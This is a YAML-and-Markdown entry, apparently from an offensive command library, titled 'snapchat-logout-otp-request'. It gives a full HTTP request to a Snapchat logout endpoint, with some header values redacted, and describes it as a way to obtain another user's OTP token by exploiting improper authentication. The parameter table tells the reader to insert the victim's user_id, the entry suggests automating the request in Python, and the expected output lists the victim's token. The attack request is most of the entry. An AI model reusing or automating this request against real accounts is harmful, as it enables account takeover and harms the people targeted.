---
data: |-
  POST /scauth/otp/droid/logout HTTP/1.1
  Host: gcp.api.snapchat.com
  Connection: close
  Content-Length: 168
  X-Snapchat-Client-Auth: ██████
  X-Snapchat-UUID: ███
  x-snapchat-userid: █████
  username: ███
  req_token: █████████
  timestamp: 1594604280000
  Accept: application/json
  User-Agent: Snapchat/10.78.1.0 █████
  Accept-Language: en-GB;q=1, en;q=0.9
  Content-Type: application/json; charset=utf-8
  Accept-Encoding: gzip, deflate

  {"user_id":"████","device_id":"███████","device_name":"███████"}
tags:
  - api-request
  - otp-bypass
type: command
executor: http
platforms:
  - Web
id: 99a3727d-c1e5-4d28-9972-d72ff30ba12c
created_at: '2025-12-11T06:10:40.167Z'
updated_at: '2025-12-11T06:10:40.167Z'
verified: false
validated: true
submitted: true
---
# snapchat-logout-otp-request

## Command

```http
POST /scauth/otp/droid/logout HTTP/1.1
Host: gcp.api.snapchat.com
Connection: close
Content-Length: 168
X-Snapchat-Client-Auth: ██████
X-Snapchat-UUID: ███
x-snapchat-userid: █████
username: ███
req_token: █████████
timestamp: 1594604280000
Accept: application/json
User-Agent: Snapchat/10.78.1.0 █████
Accept-Language: en-GB;q=1, en;q=0.9
Content-Type: application/json; charset=utf-8
Accept-Encoding: gzip, deflate

{"user_id":"████","device_id":"███████","device_name":"███████"}
```

## Description

Sends a manipulated logout request to Snapchat's API to obtain an OTP token for a specified user_id, exploiting improper authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| user_id | Set to victim's user_id to target them | Yes |
| device_id | Device identifier | Yes |
| device_name | Device name | Yes |
| req_token | Request token | Yes |
| timestamp | Request timestamp | Yes |

## Examples

### Basic Usage

```http
POST /scauth/otp/droid/logout HTTP/1.1
Host: gcp.api.snapchat.com
... (with victim user_id)
```

### Advanced Usage

Use in a Python script with requests library to automate.

## Expected Output

HTTP/1.1 200 OK with JSON response containing status SUCCESS, victim's user_id, token, and expiry_hint.

## Related

- [[commands/snapchat-otp-login-request]]
- [[procedures/Manipulate-Snapchat-Logout-Endpoint-to-Obtain-Victim-OTP]]
